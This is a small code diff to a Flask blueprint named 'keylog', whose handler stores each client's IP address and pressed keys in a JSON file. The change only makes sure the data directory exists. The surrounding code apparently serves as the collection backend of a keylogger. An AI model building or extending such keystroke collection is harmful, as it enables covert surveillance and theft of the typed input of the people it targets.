@@ -5,6 +5,7 @@ from typing import List, Dict, Final
 import string
 import os
 import re
+from pathlib import Path
 keylog: Blueprint = Blueprint('keylog', __name__, None)
 
 data_file: str = "data/keylog.json"
@@ -22,6 +23,9 @@ def record() -> Dict[str, int]:
 
     ip: str = request.remote_addr
     letters: List[str] = data['keys_pressed']
+
+    if not Path(f'.{os.sep}data').exists():
+        Path(f'.{os.sep}data').mkdir()
 
     data_file: str = "data/keylog.json"
     if os.path.exists(data_file):
